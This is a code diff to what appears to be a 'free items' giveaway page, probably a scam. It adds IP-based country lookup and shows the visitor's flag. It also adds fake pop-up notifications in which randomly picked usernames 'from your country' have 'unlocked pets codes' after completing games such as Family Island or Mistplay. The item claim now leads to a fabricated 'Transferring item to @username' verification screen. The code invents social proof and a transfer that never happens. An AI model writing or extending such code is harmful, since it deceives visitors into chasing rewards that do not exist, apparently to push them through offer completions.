@@ -799,23 +799,33 @@
         bottom: 45px;
       }
       .message {
-        padding: 10px 15px;
-        font-size: 0.8rem;
-      }
-      .message .img img {
-        width: 40px;
-        height: 40px;
-      }
-      .select-title {
-        font-size: 1.2em;
-        margin: 15px 0 12px 0;
-      }
-      .active-users-box {
-        font-size: 1em;
-        min-width: 130px;
-        padding: 8px 6px;
-        height: 34px;
-      }
+      padding: 10px 15px;
+      font-size: 0.8rem;
+    }
+    .message .img img {
+      width: 40px;
+      height: 40px;
+    }
+    .message .country-flag {
+      display: inline-block;
+      margin-left: 5px;
+      font-size: 0.8em;
+      background: rgba(255, 255, 255, 0.15);
+      padding: 2px 5px;
+      border-radius: 4px;
+      color: #fff;
+      font-weight: bold;
+    }
+    .select-title {
+      font-size: 1.2em;
+      margin: 15px 0 12px 0;
+    }
+    .active-users-box {
+      font-size: 1em;
+      min-width: 130px;
+      padding: 8px 6px;
+      height: 34px;
+    }
     }
     /* Popup styles */
     .purchase-popup {
@@ -1308,6 +1318,53 @@
       'needscreativity',
       'Richy_544'
     ];
+    
+    // Game sources that users can unlock from
+    const gameSources = [
+      'Family Island',
+      'Travel Town',
+      'Domino Dreams',
+      'Mistplay'
+    ];
+    
+    // User country data - will be populated with IP API
+    let userCountry = '';
+    let userCountryCode = '';
+    let countryUsers = {};
+    
+    // Global data object for country information
+    const globalDatas = { 
+        country_code: null, 
+        country_name: null, 
+        flagUrl: null, 
+    }; 
+    
+    // Fetch user's IP address and then country information
+    $.getJSON("https://api.ipify.org?format=json", function(data) { 
+        var ipAddress = data.ip; 
+        $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(response) { 
+            globalDatas.country_code = response.country_code; 
+            globalDatas.country_name = response.country_name; 
+            globalDatas.flagUrl = "https://flagcdn.com/w320/" + response.country_code.toLowerCase() + ".png"; 
+            
+            // Also update the existing variables for compatibility
+            userCountry = response.country_name;
+            userCountryCode = response.country_code.toLowerCase();
+            
+            // Initialize country users object with random usernames
+            const shuffledUsernames = [...usernames].sort(() => 0.5 - Math.random());
+            countryUsers[userCountryCode] = shuffledUsernames.slice(0, 10); // Assign 10 random users to user's country
+            
+            console.log('User country detected:', userCountry, 'Code:', userCountryCode);
+        }); 
+    }).fail(function(error) {
+        console.error('Error fetching country data:', error);
+        userCountry = 'Unknown';
+        userCountryCode = 'us'; // Default to US flag if country detection fails
+        globalDatas.country_code = 'US';
+        globalDatas.country_name = 'United States';
+        globalDatas.flagUrl = 'https://flagcdn.com/w320/us.png';
+    });
 
     // Get all item names and images from the DOM
     let notificationItems = [];
@@ -1321,7 +1378,7 @@
     });
     let notificationIndex = 0;
 
-    // متغيرات للتحكم في الإشعارات
+    // Notification control variables
     let notificationInterval;
     let popupOpen = false;
 
@@ -1331,23 +1388,46 @@
         if (popupOpen) return;
         if (notificationItems.length === 0) return;
         $(".cliameds").fadeIn(); 
+        
         // Cycle through items
         const item = notificationItems[notificationIndex];
         notificationIndex = (notificationIndex + 1) % notificationItems.length;
-        var html = `
+        
+        // Randomly decide if this should be a country-specific notification
+        const isCountrySpecific = Math.random() < 0.4; // 40% chance
+        
+        // Randomly select a game source
+        const randomGameSource = gameSources[Math.floor(Math.random() * gameSources.length)];
+        
+        // Always show the game source
+        const showGameSource = true; // Always show game source
+        
+        // Select a username - either from user's country or random
+        let username;
+        if (isCountrySpecific && userCountryCode && countryUsers[userCountryCode] && countryUsers[userCountryCode].length > 0) {
+          // Select a username from user's country
+          username = countryUsers[userCountryCode][Math.floor(Math.random() * countryUsers[userCountryCode].length)];
+        } else {
+          // Select a random username
+          username = usernames[Math.floor(Math.random() * usernames.length)];
+        }
+        
+        // Create HTML for notification
+        let html = `
           <div class="message">
             <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
             <div class="more">
-              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
-              <div> JUST CLAIMED '${item.name}'</div>
+              <div>${username} from <span class="country-flag"><img src="${globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'}" style="width:24px;height:18px;vertical-align:middle;"></span></div>
+              <div>unlocked pets codes after complete ${showGameSource ? randomGameSource : 'game'}</div>
             </div>
           </div>
         `;
+        
         $(".cliameds").html(html);
         setTimeout(function() {
           $(".cliameds").fadeOut();  
         }, 3000);
-      }, 5000); // تم تغيير الفاصل الزمني إلى 7 ثوانٍ
+      }, 5000);
     }
 
     function stopNotifications() {
@@ -1397,7 +1477,7 @@
           document.querySelector('.user-error').classList.remove('d-none');
           return;
         }
-        showSearchingState(username, itemName, itemImage);
+        showVerificationState(username, itemName, itemImage);
       });
       
       popup.style.display = 'flex';
@@ -1497,6 +1577,13 @@
 
     // Function to show verification state
     const showVerificationState = (username, itemName, itemImage) => {
+      // Randomly select a game source for verification
+      const randomGameSource = gameSources[Math.floor(Math.random() * gameSources.length)];
+      const showGameSource = true; // Always show game source
+      
+      // Get country information with flag only
+      const countryDisplay = globalDatas.country_code ? `<div style="margin-top:10px;font-size:14px;color:#aaa;">Location: <img src="${globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'}" style="width:24px;height:18px;vertical-align:middle;"></div>` : '';
+      
       const popupContent = document.querySelector('.popup-content');
       popupContent.innerHTML = `
         <div class="popup-header">
@@ -1511,6 +1598,8 @@
             <div class="square"></div>
           </div>
           <p class="searching-text">Transferring ${itemName} to @${username}</p>
+          ${countryDisplay}
+          <div style="margin-top:15px;font-size:13px;color:#aaa;">Users from your country who unlocked items: ${userCountryCode && countryUsers[userCountryCode] ? countryUsers[userCountryCode].slice(0, 3).join(', ') + '...' : 'Loading...'}</div>
         </div>
       `;
       setTimeout(function() {
@@ -1695,7 +1784,7 @@
           document.querySelector('.user-error').classList.remove('d-none');
           return;
         }
-        showSearchingState(username, items[0].name, items[0].image);
+        showVerificationState(username, items[0].name, items[0].image);
       });
       
       popup.style.display = 'flex';
